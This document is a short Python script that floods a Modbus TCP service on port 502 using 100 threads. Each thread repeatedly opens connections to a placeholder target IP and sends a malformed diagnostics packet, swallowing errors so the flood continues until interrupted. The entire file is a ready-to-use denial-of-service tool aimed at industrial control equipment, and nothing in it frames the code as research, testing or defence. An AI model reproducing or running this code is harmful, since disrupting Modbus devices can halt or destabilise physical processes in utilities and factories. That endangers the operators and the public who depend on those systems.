import socket
import threading
import time
import signal
import sys

target_ip = "XXX.XXX.XXX.XXX"  # Put target IP here
target_port = 502              # Modbus TCP default port
number_of_threads = 100

malformed_packet = bytes.fromhex("000100000006FF0800000000")

stop_event = threading.Event()

def flood():
    while not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target_ip, target_port))
                while not stop_event.is_set():
                    s.sendall(malformed_packet)
                    time.sleep(0.01)  # slight delay to avoid tight loop
        except Exception:
            # ignore network errors and continue
            pass

def signal_handler(sig, frame):
    print("Interrupted, stopping flood...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)

threads = []
for _ in range(number_of_threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

print(f"Flood started on {target_ip}:{target_port} with {number_of_threads} threads. Press Ctrl+C to stop.")

while not stop_event.is_set():
    time.sleep(1)

print("Flood stopped. Exiting.")
